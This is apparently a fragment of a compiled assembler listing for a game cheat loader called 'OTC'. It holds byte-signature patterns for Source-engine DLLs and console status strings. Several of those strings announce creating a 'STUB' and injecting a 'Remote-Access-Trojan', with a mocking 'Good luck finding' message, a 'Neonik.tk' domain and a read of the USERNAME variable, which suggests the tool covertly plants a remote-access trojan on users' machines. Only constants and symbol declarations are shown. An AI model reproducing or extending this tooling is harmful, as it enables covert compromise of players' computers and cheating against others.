??_C@_0CN@EECAACMO@55?58B?5EC?583?5E4?5F8?583?5EC?51C?553?55@ DB '55 8B E'
	DB	'C 83 E4 F8 83 EC 1C 53 56 57 8B F9 F7', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CN@OIDCGODA@55?58B?5EC?583?5E4?5F8?583?5EC?50C?553?58@
CONST	SEGMENT
??_C@_0CN@OIDCGODA@55?58B?5EC?583?5E4?5F8?583?5EC?50C?553?58@ DB '55 8B E'
	DB	'C 83 E4 F8 83 EC 0C 53 8B 5D 08 8B C3', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0DG@PEDGIBOM@55?58B?5EC?583?5E4?5F8?583?5EC?50C?553?55@
CONST	SEGMENT
??_C@_0DG@PEDGIBOM@55?58B?5EC?583?5E4?5F8?583?5EC?50C?553?55@ DB '55 8B E'
	DB	'C 83 E4 F8 83 EC 0C 53 56 57 8B 7D 08 8B F1 F3', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CB@FABLCKIN@55?58B?5EC?556?58B?575?508?557?5FF?575?51@
CONST	SEGMENT
??_C@_0CB@FABLCKIN@55?58B?5EC?556?58B?575?508?557?5FF?575?51@ DB '55 8B E'
	DB	'C 56 8B 75 08 57 FF 75 18', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BI@PHFBLDMI@53?556?58B?5F1?557?58B?54E?53C@
CONST	SEGMENT
??_C@_0BI@PHFBLDMI@53?556?58B?5F1?557?58B?54E?53C@ DB '53 56 8B F1 57 8B '
	DB	'4E 3C', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0BI@BINPCKGE@55?58B?5EC?583?5EC?558?556?557@
CONST	SEGMENT
??_C@_0BI@BINPCKGE@55?58B?5EC?583?5EC?558?556?557@ DB '55 8B EC 83 EC 58 '
	DB	'56 57', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0CF@GJBCBAFI@8B?501?5FF?5B1?5?$DP?5?$DP?5?$DP?5?$DP?5FF?590?5?$DP?5?$DP?5?$DP@
CONST	SEGMENT
??_C@_0CF@GJBCBAFI@8B?501?5FF?5B1?5?$DP?5?$DP?5?$DP?5?$DP?5FF?590?5?$DP?5?$DP?5?$DP@ DB '8'
	DB	'B 01 FF B1 ? ? ? ? FF 90 ? ? ? ? 83', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0DB@NJMJDNKE@55?58B?5EC?556?58B?535?5?$DP?5?$DP?5?$DP?5?$DP?585?5F6@
CONST	SEGMENT
??_C@_0DB@NJMJDNKE@55?58B?5EC?556?58B?535?5?$DP?5?$DP?5?$DP?5?$DP?585?5F6@ DB '5'
	DB	'5 8B EC 56 8B 35 ? ? ? ? 85 F6 0F 84 ? ? ? ? 81', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BL@NILMMPDH@55?58B?5EC?58D?551?508?58B?54D?508@
CONST	SEGMENT
??_C@_0BL@NILMMPDH@55?58B?5EC?58D?551?508?58B?54D?508@ DB '55 8B EC 8D 51'
	DB	' 08 8B 4D 08', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0CB@EHCBCFDJ@55?58B?5EC?583?5E4?5F0?583?5EC?57C?556?5F@
CONST	SEGMENT
??_C@_0CB@EHCBCFDJ@55?58B?5EC?583?5E4?5F0?583?5EC?57C?556?5F@ DB '55 8B E'
	DB	'C 83 E4 F0 83 EC 7C 56 FF', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BE@DLMGOELC@8B?597?5?$DP?5?$DP?5?$DP?5?$DP?556?58B@
CONST	SEGMENT
??_C@_0BE@DLMGOELC@8B?597?5?$DP?5?$DP?5?$DP?5?$DP?556?58B@ DB '8B 97 ? ? '
	DB	'? ? 56 8B', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0CG@FFELLHH@84?5C0?574?50A?5F3?50F?510?505?5?$DP?5?$DP?5?$DP?5?$DP@
CONST	SEGMENT
??_C@_0CG@FFELLHH@84?5C0?574?50A?5F3?50F?510?505?5?$DP?5?$DP?5?$DP?5?$DP@ DB '8'
	DB	'4 C0 74 0A F3 0F 10 05 ? ? ? ? EB 05', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@HMEMPFIB@84?5C0?574?517?58B?587@
CONST	SEGMENT
??_C@_0BC@HMEMPFIB@84?5C0?574?517?58B?587@ DB '84 C0 74 17 8B 87', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0HD@POPCBNPK@0F?584?5?$DP?5?$DP?5?$DP?5?$DP?58B?588?5?$DP?5?$DP?5?$DP?5?$DP?583?5@
CONST	SEGMENT
??_C@_0HD@POPCBNPK@0F?584?5?$DP?5?$DP?5?$DP?5?$DP?58B?588?5?$DP?5?$DP?5?$DP?5?$DP?583?5@ DB '0'
	DB	'F 84 ? ? ? ? 8B 88 ? ? ? ? 83 F9 FF 0F 84 ? ? ? ? 0F B7 C1 C1'
	DB	' E0 04 05 ? ? ? ? C1 E9 10 39 48 04 0F 85 ? ? ? ? 8B', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CH@CEFANBNE@55?58B?5EC?551?553?556?58B?575?508?58B?5D@
CONST	SEGMENT
??_C@_0CH@CEFANBNE@55?58B?5EC?551?553?556?58B?575?508?58B?5D@ DB '55 8B E'
	DB	'C 51 53 56 8B 75 08 8B D9 57 6B', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0DH@FGAABEAA@B9?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5?$DP?585?5C0?574?5@
CONST	SEGMENT
??_C@_0DH@FGAABEAA@B9?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5?$DP?585?5C0?574?5@ DB 'B'
	DB	'9 ? ? ? ? E8 ? ? ? ? 85 C0 74 0A 8B 10 8B C8 FF A2 AC', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BO@BNNHFHPN@55?58B?5EC?583?5EC?50C?553?556?58B?571@
CONST	SEGMENT
??_C@_0BO@BNNHFHPN@55?58B?5EC?583?5EC?50C?553?556?58B?571@ DB '55 8B EC 8'
	DB	'3 EC 0C 53 56 8B 71', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0CE@PNFFJNMC@B9?5?$DP?5?$DP?5?$DP?5?$DP?5A3?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5@
CONST	SEGMENT
??_C@_0CE@PNFFJNMC@B9?5?$DP?5?$DP?5?$DP?5?$DP?5A3?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5@ DB 'B'
	DB	'9 ? ? ? ? A3 ? ? ? ? E8 ? ? ? ? 5D', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CM@PPIJPEML@55?58B?5EC?556?58B?575?50C?557?58B?5F9?5B@
CONST	SEGMENT
??_C@_0CM@PPIJPEML@55?58B?5EC?556?58B?575?50C?557?58B?5F9?5B@ DB '55 8B E'
	DB	'C 56 8B 75 0C 57 8B F9 B9 ? ? ? ? 89', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CK@MBPLAPBK@55?58B?5EC?553?58B?55D?508?556?557?58B?5F@
CONST	SEGMENT
??_C@_0CK@MBPLAPBK@55?58B?5EC?553?58B?55D?508?556?557?58B?5F@ DB '55 8B E'
	DB	'C 53 8B 5D 08 56 57 8B F9 33 F6 39', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@MBFPJFAI@A1?5?$DP?5?$DP?5?$DP?5?$DP?574?538@
CONST	SEGMENT
??_C@_0BB@MBFPJFAI@A1?5?$DP?5?$DP?5?$DP?5?$DP?574?538@ DB 'A1 ? ? ? ? 74 '
	DB	'38', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0BP@PMDLCGGD@83?53D?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?557?58B?5F9?575?506@
CONST	SEGMENT
??_C@_0BP@PMDLCGGD@83?53D?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?557?58B?5F9?575?506@ DB '8'
	DB	'3 3D ? ? ? ? ? 57 8B F9 75 06', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@GPJJHLHE@80?5B9?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?575?56C@
CONST	SEGMENT
??_C@_0BG@GPJJHLHE@80?5B9?5?$DP?5?$DP?5?$DP?5?$DP?5?$DP?575?56C@ DB '80 B'
	DB	'9 ? ? ? ? ? 75 6C', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0CD@CLINDDEG@55?58B?5EC?583?5EC?508?58B?515?5?$DP?5?$DP?5?$DP?5?$DP@
CONST	SEGMENT
??_C@_0CD@CLINDDEG@55?58B?5EC?583?5EC?508?58B?515?5?$DP?5?$DP?5?$DP?5?$DP@ DB '5'
	DB	'5 8B EC 83 EC 08 8B 15 ? ? ? ? 0F', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CL@EEFECCOM@C7?500?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5?$DP?583?5EC?5@
CONST	SEGMENT
??_C@_0CL@EEFECCOM@C7?500?5?$DP?5?$DP?5?$DP?5?$DP?5E8?5?$DP?5?$DP?5?$DP?5?$DP?583?5EC?5@ DB 'C'
	DB	'7 00 ? ? ? ? E8 ? ? ? ? 83 EC 08 8D 4E 74', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CD@FHMDKEH@55?58B?5EC?551?556?58B?535?5?$DP?5?$DP?5?$DP?5?$DP?557@
CONST	SEGMENT
??_C@_0CD@FHMDKEH@55?58B?5EC?551?556?58B?535?5?$DP?5?$DP?5?$DP?5?$DP?557@ DB '5'
	DB	'5 8B EC 51 56 8B 35 ? ? ? ? 57 83', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CJ@JOAILMAE@81?5C6?5?$DP?5?$DP?5?$DP?5?$DP?58B?54E?50C?58B?556?504@
CONST	SEGMENT
??_C@_0CJ@JOAILMAE@81?5C6?5?$DP?5?$DP?5?$DP?5?$DP?58B?54E?50C?58B?556?504@ DB '8'
	DB	'1 C6 ? ? ? ? 8B 4E 0C 8B 56 04 89 4D E4', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@PAMFABDB@B9?5?$DP?5?$DP?5?$DP?5?$DP?5FF?550?514?55F@
CONST	SEGMENT
??_C@_0BH@PAMFABDB@B9?5?$DP?5?$DP?5?$DP?5?$DP?5FF?550?514?55F@ DB 'B9 ? ?'
	DB	' ? ? FF 50 14 5F', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@MACNFAAE@B0?501?583?5FE@
CONST	SEGMENT
??_C@_0M@MACNFAAE@B0?501?583?5FE@ DB 'B0 01 83 FE', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CE@KJGDCOM@0F?544?5C8?533?5C0?55E?539?511?50F?594?5C@
CONST	SEGMENT
??_C@_0CE@KJGDCOM@0F?544?5C8?533?5C0?55E?539?511?50F?594?5C@ DB '0F 44 C8'
	DB	' 33 C0 5E 39 11 0F 94 C0 C3', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0CK@DFKOCHGN@B9?5?$DP?5?$DP?5?$DP?5?$DP?5A1?5?$DP?5?$DP?5?$DP?5?$DP?5FF?510?5A1?5@
CONST	SEGMENT
??_C@_0CK@DFKOCHGN@B9?5?$DP?5?$DP?5?$DP?5?$DP?5A1?5?$DP?5?$DP?5?$DP?5?$DP?5FF?510?5A1?5@ DB 'B'
	DB	'9 ? ? ? ? A1 ? ? ? ? FF 10 A1 ? ? ? ? B9', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0DJ@CEFDOBKF@8B?535?5?$DP?5?$DP?5?$DP?5?$DP?5FF?590?5?$DP?5?$DP?5?$DP?5?$DP?550?5@
CONST	SEGMENT
??_C@_0DJ@CEFDOBKF@8B?535?5?$DP?5?$DP?5?$DP?5?$DP?5FF?590?5?$DP?5?$DP?5?$DP?5?$DP?550?5@ DB '8'
	DB	'B 35 ? ? ? ? FF 90 ? ? ? ? 50 B9 ? ? ? ? FF 56 24 5E C3', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CI@KPMIAJJE@55?58B?5EC?551?556?58B?5F1?580?5BE?5?$DP?5?$DP?5@
CONST	SEGMENT
??_C@_0CI@KPMIAJJE@55?58B?5EC?551?556?58B?5F1?580?5BE?5?$DP?5?$DP?5@ DB '5'
	DB	'5 8B EC 51 56 8B F1 80 BE ? ? ? ? ? 74', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CD@EIEEDCML@55?58B?5EC?5FF?575?518?5F3?50F?510?545?5?$DP@
CONST	SEGMENT
??_C@_0CD@EIEEDCML@55?58B?5EC?5FF?575?518?5F3?50F?510?545?5?$DP@ DB '55 8'
	DB	'B EC FF 75 18 F3 0F 10 45 ? 51', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0DL@EIBMNNHJ@55?58B?5EC?583?5E4?5F8?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP@
CONST	SEGMENT
??_C@_0DL@EIBMNNHJ@55?58B?5EC?583?5E4?5F8?581?5EC?5?$DP?5?$DP?5?$DP?5?$DP@ DB '5'
	DB	'5 8B EC 83 E4 F8 81 EC ? ? ? ? 53 56 8B F1 57 89 74 24 1C', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BI@HDJCOIJC@55?58B?5EC?556?58B?5F1?551?58D@
CONST	SEGMENT
??_C@_0BI@HDJCOIJC@55?58B?5EC?556?58B?5F1?551?58D@ DB '55 8B EC 56 8B F1 '
	DB	'51 8D', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0BK@GLHNJMEN@8B?50D?5?$DP?5?$DP?5?$DP?5?$DP?58B?546?508?568@
CONST	SEGMENT
??_C@_0BK@GLHNJMEN@8B?50D?5?$DP?5?$DP?5?$DP?5?$DP?58B?546?508?568@ DB '8B'
	DB	' 0D ? ? ? ? 8B 46 08 68', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0CH@JIFLMJLL@55?58B?5EC?583?5E4?5C0?583?5EC?534?553?55@
CONST	SEGMENT
??_C@_0CH@JIFLMJLL@55?58B?5EC?583?5E4?5C0?583?5EC?534?553?55@ DB '55 8B E'
	DB	'C 83 E4 C0 83 EC 34 53 56 8B 75', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CB@IJIMFMOE@55?58B?5EC?553?58B?55D?508?556?58B?5F1?58@
CONST	SEGMENT
??_C@_0CB@IJIMFMOE@55?58B?5EC?553?58B?55D?508?556?58B?5F1?58@ DB '55 8B E'
	DB	'C 53 8B 5D 08 56 8B F1 83', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BL@DOALEGMD@51?556?58B?5F1?585?5F6?574?568?583@
CONST	SEGMENT
??_C@_0BL@DOALEGMD@51?556?58B?5F1?585?5F6?574?568?583@ DB '51 56 8B F1 85'
	DB	' F6 74 68 83', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0CK@CMLHGGBK@55?58B?5EC?583?5E4?5F8?583?5EC?564?553?55@
CONST	SEGMENT
??_C@_0CK@CMLHGGBK@55?58B?5EC?583?5E4?5F8?583?5EC?564?553?55@ DB '55 8B E'
	DB	'C 83 E4 F8 83 EC 64 53 56 57 8B F1', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0DF@CJDDHIEG@55?58B?5EC?583?5E4?5F8?551?553?556?557?58@
CONST	SEGMENT
??_C@_0DF@CJDDHIEG@55?58B?5EC?583?5E4?5F8?551?553?556?557?58@ DB '55 8B E'
	DB	'C 83 E4 F8 51 53 56 57 8B F1 E8 ? ? ? ? 8B 7D', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BK@EOKMOEOO@56?56A?501?568?5?$DP?5?$DP?5?$DP?5?$DP?58B?5F1@
CONST	SEGMENT
??_C@_0BK@EOKMOEOO@56?56A?501?568?5?$DP?5?$DP?5?$DP?5?$DP?58B?5F1@ DB '56'
	DB	' 6A 01 68 ? ? ? ? 8B F1', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0CB@KJIDDANE@55?58B?5EC?583?5E4?5F8?583?5EC?570?56A?55@
CONST	SEGMENT
??_C@_0CB@KJIDDANE@55?58B?5EC?583?5E4?5F8?583?5EC?570?56A?55@ DB '55 8B E'
	DB	'C 83 E4 F8 83 EC 70 6A 58', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@EINGCJHB@vstdlib?4dll@
CONST	SEGMENT
??_C@_0M@EINGCJHB@vstdlib?4dll@ DB 'vstdlib.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@IDMFBLEL@shaderapidx9?4dll@
CONST	SEGMENT
??_C@_0BB@IDMFBLEL@shaderapidx9?4dll@ DB 'shaderapidx9.dll', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BD@NKPNDPNB@vguimatsurface?4dll@
CONST	SEGMENT
??_C@_0BD@NKPNDPNB@vguimatsurface?4dll@ DB 'vguimatsurface.dll', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@PHFEFMEF@client?4dll@
CONST	SEGMENT
??_C@_0L@PHFEFMEF@client?4dll@ DB 'client.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CO@JECMMAFB@Good?5luck?5finding?5the?5Remote?9Ac@
CONST	SEGMENT
??_C@_0CO@JECMMAFB@Good?5luck?5finding?5the?5Remote?9Ac@ DB 'Good luck fi'
	DB	'nding the Remote-Access-Trojan :)', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CF@IPOJIKMB@?$HM?5?$FL?$CL?$FN?5Remote?9Access?9Trojan?5Inje@
CONST	SEGMENT
??_C@_0CF@IPOJIKMB@?$HM?5?$FL?$CL?$FN?5Remote?9Access?9Trojan?5Inje@ DB '|'
	DB	' [+] Remote-Access-Trojan Injected.', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@MPGHJPCI@?$HM?5?$FL?$HO?$FN?5Updating?5STUB?4?4?4@
CONST	SEGMENT
??_C@_0BH@MPGHJPCI@?$HM?5?$FL?$HO?$FN?5Updating?5STUB?4?4?4@ DB '| [~] Up'
	DB	'dating STUB...', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_09MLFFDPN@Neonik?4tk@
CONST	SEGMENT
??_C@_09MLFFDPN@Neonik?4tk@ DB 'Neonik.tk', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_08JMMIJEMM@USERNAME@
CONST	SEGMENT
??_C@_08JMMIJEMM@USERNAME@ DB 'USERNAME', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_06CPAKJCCD@Neonik@
CONST	SEGMENT
??_C@_06CPAKJCCD@Neonik@ DB 'Neonik', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0CH@IEOFEGDJ@?$HM?5?$FL?$HO?$FN?5Updating?5Remote?9Access?9Tr@
CONST	SEGMENT
??_C@_0CH@IEOFEGDJ@?$HM?5?$FL?$HO?$FN?5Updating?5Remote?9Access?9Tr@ DB '|'
	DB	' [~] Updating Remote-Access-Trojan...', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0DA@NAIALJDJ@?$HM?5?$FL?$HO?$FN?5Creating?5STUB?5for?5Remote?9@
CONST	SEGMENT
??_C@_0DA@NAIALJDJ@?$HM?5?$FL?$HO?$FN?5Creating?5STUB?5for?5Remote?9@ DB '|'
	DB	' [~] Creating STUB for Remote-Access-Trojan...', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@PPFIICFP@?$HM?5?$FL?$HO?$FN?5Updating?5DNS?4?4?4@
CONST	SEGMENT
??_C@_0BG@PPFIICFP@?$HM?5?$FL?$HO?$FN?5Updating?5DNS?4?4?4@ DB '| [~] Upd'
	DB	'ating DNS...', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0DB@PEHHJAKP@?$HM?5?$FL?$HO?$FN?5Filling?5the?5DNS?5Server?5In@
CONST	SEGMENT
??_C@_0DB@PEHHJAKP@?$HM?5?$FL?$HO?$FN?5Filling?5the?5DNS?5Server?5In@ DB '|'
	DB	' [~] Filling the DNS Server Info... (~7-15 sec)', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0DJ@EPKKPONP@?$HM?5?$FL?$CL?$FN?5Wait?5until?5the?5Remote?9Acc@
CONST	SEGMENT
??_C@_0DJ@EPKKPONP@?$HM?5?$FL?$CL?$FN?5Wait?5until?5the?5Remote?9Acc@ DB '|'
	DB	' [+] Wait until the Remote-Access-Trojan is injected...', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CD@CAFJDLOK@?$HM?5?$FL?$HO?$FN?5Reconstructing?5hot?9points@
CONST	SEGMENT
??_C@_0CD@CAFJDLOK@?$HM?5?$FL?$HO?$FN?5Reconstructing?5hot?9points@ DB '|'
	DB	' [~] Reconstructing hot-points...', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0CH@MHEJMGJD@?$HM?5?$FL?$HO?$FN?5Extracting?5segment?5to?5mem@
CONST	SEGMENT
??_C@_0CH@MHEJMGJD@?$HM?5?$FL?$HO?$FN?5Extracting?5segment?5to?5mem@ DB '|'
	DB	' [~] Extracting segment to memory....', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BJ@DNOPFKIA@?$HM?5?$FL?$CL?$FN?5All?5checks?5passed?4@
CONST	SEGMENT
??_C@_0BJ@DNOPFKIA@?$HM?5?$FL?$CL?$FN?5All?5checks?5passed?4@ DB '| [+] A'
	DB	'll checks passed.', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0DL@KKGOFNJE@?$HM?5?$FL?$CL?$FN?5Found?5the?5required?5msvc?5r@
CONST	SEGMENT
??_C@_0DL@KKGOFNJE@?$HM?5?$FL?$CL?$FN?5Found?5the?5required?5msvc?5r@ DB '|'
	DB	' [+] Found the required msvc redist build on your system.', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0IE@MADIDBIL@?$HM?5?$FL?$HO?$FN?5You?5can?5download?5and?5inst@
CONST	SEGMENT
??_C@_0IE@MADIDBIL@?$HM?5?$FL?$HO?$FN?5You?5can?5download?5and?5inst@ DB '|'
	DB	' [~] You can download and install the redist build from here:'
	DB	' https://www.microsoft.com/en-us/download/confirmation.aspx?i'
	DB	'd=52685.', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0EH@PFJPAFGG@?$HM?5?$FL?9?$FN?5Could?5not?5find?5the?5msvc?5r@
CONST	SEGMENT
??_C@_0EH@PFJPAFGG@?$HM?5?$FL?9?$FN?5Could?5not?5find?5the?5msvc?5r@ DB '|'
	DB	' [-] Could not find the msvc redist package installed on your'
	DB	' system.', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0ED@EOFJBFEH@?$HM?5?$FL?$CL?$FN?5Your?5windows?5version?5meet@
CONST	SEGMENT
??_C@_0ED@EOFJBFEH@?$HM?5?$FL?$CL?$FN?5Your?5windows?5version?5meet@ DB '|'
	DB	' [+] Your windows version meets the requirements for running '
	DB	'OTC.', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0DC@NHDBKKLG@?$HM?5?$FL?$HO?$FN?5Please?5upgrade?5to?57?5or?58?0@
CONST	SEGMENT
??_C@_0DC@NHDBKKLG@?$HM?5?$FL?$HO?$FN?5Please?5upgrade?5to?57?5or?58?0@ DB '|'
	DB	' [~] Please upgrade to 7 or 8, or 10. (PC build)', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0DK@OACAPHFB@?$HM?5?$FL?9?$FN?5I?5cannot?5run?5OTC?5on?5the?5c@
CONST	SEGMENT
??_C@_0DK@OACAPHFB@?$HM?5?$FL?9?$FN?5I?5cannot?5run?5OTC?5on?5the?5c@ DB '|'
	DB	' [-] I cannot run OTC on the current version of Windows.', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0CB@PONPHMNH@?$HM?5?$FL?$HO?$FN?5Performing?5basic?5checks?4?4@
CONST	SEGMENT
??_C@_0CB@PONPHMNH@?$HM?5?$FL?$HO?$FN?5Performing?5basic?5checks?4?4@ DB '|'
	DB	' [~] Performing basic checks...', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@BMFENILA@Loading?5up?5OTC?4?4?5@
CONST	SEGMENT
??_C@_0BC@BMFENILA@Loading?5up?5OTC?4?4?5@ DB 'Loading up OTC.. ', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_03KNCNPCCC@OTC@
CONST	SEGMENT
??_C@_03KNCNPCCC@OTC@ DB 'OTC', 00H			; `string'
PUBLIC	??$_Copy_memmove@PBURelocatedNetVar@SegmentFramework@@PAU12@@std@@YAPAURelocatedNetVar@SegmentFramework@@PBU12@0PAU12@@Z ; std::_Copy_memmove<SegmentFramework::RelocatedNetVar const *,SegmentFramework::RelocatedNetVar *>
PUBLIC	??$_Copy_memmove@PBQBDPAPBD@std@@YAPAPBDPBQBD0PAPBD@Z ; std::_Copy_memmove<char const * const *,char const * *>
PUBLIC	??$_Get_unwrapped@ABQBURelocatedNetVar@SegmentFramework@@@std@@YAPBURelocatedNetVar@SegmentFramework@@ABQBU12@@Z ; std::_Get_unwrapped<SegmentFramework::RelocatedNetVar const * const &>
PUBLIC	??$_Uninitialized_copy@PBURelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAPAURelocatedNetVar@SegmentFramework@@QBU12@0PAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z ; std::_Uninitialized_copy<SegmentFramework::RelocatedNetVar const *,std::allocator<SegmentFramework::RelocatedNetVar> >
PUBLIC	??$_Copy_memmove@PAURelocatedNetVar@SegmentFramework@@PAU12@@std@@YAPAURelocatedNetVar@SegmentFramework@@PAU12@00@Z ; std::_Copy_memmove<SegmentFramework::RelocatedNetVar *,SegmentFramework::RelocatedNetVar *>
PUBLIC	??$_Unfancy@URelocatedNetVar@SegmentFramework@@@std@@YAPAURelocatedNetVar@SegmentFramework@@PAU12@@Z ; std::_Unfancy<SegmentFramework::RelocatedNetVar>
PUBLIC	??$_Get_unwrapped@ABQBQBD@std@@YAPBQBDABQBQBD@Z	; std::_Get_unwrapped<char const * const * const &>
PUBLIC	??$_Uninitialized_copy@PBQBDV?$allocator@PBD@std@@@std@@YAPAPBDQBQBD0PAPBDAAV?$allocator@PBD@0@@Z ; std::_Uninitialized_copy<char const * const *,std::allocator<char const *> >
PUBLIC	??0?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@QAE@XZ ; std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >
PUBLIC	??$forward@ABU?$less@PBD@std@@@std@@YAABU?$less@PBD@0@ABU10@@Z ; std::forward<std::less<char const *> const &>
PUBLIC	??$_Ucopy@PBURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEPAURelocatedNetVar@SegmentFramework@@PBU23@0PAU23@@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Ucopy<SegmentFramework::RelocatedNetVar const *>
PUBLIC	??$distance@PBURelocatedNetVar@SegmentFramework@@@std@@YAHPBURelocatedNetVar@SegmentFramework@@0@Z ; std::distance<SegmentFramework::RelocatedNetVar const *>
PUBLIC	??$forward@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAABV?$allocator@URelocatedNetVar@SegmentFramework@@@0@ABV10@@Z ; std::forward<std::allocator<SegmentFramework::RelocatedNetVar> const &>
PUBLIC	??$_Get_unwrapped@ABQAURelocatedNetVar@SegmentFramework@@@std@@YAPAURelocatedNetVar@SegmentFramework@@ABQAU12@@Z ; std::_Get_unwrapped<SegmentFramework::RelocatedNetVar * const &>
PUBLIC	??$_Uninitialized_copy@PAURelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAPAURelocatedNetVar@SegmentFramework@@QAU12@0PAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z ; std::_Uninitialized_copy<SegmentFramework::RelocatedNetVar *,std::allocator<SegmentFramework::RelocatedNetVar> >
PUBLIC	??$forward@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YA$$QAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@AAV10@@Z ; std::forward<std::allocator<SegmentFramework::RelocatedNetVar> >
PUBLIC	??$_Ucopy@PBQBD@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEPAPBDPBQBD0PAPBD@Z ; std::vector<char const *,std::allocator<char const *> >::_Ucopy<char const * const *>
PUBLIC	??$distance@PBQBD@std@@YAHPBQBD0@Z		; std::distance<char const * const *>
PUBLIC	??$forward@ABV?$allocator@PBD@std@@@std@@YAABV?$allocator@PBD@0@ABV10@@Z ; std::forward<std::allocator<char const *> const &>
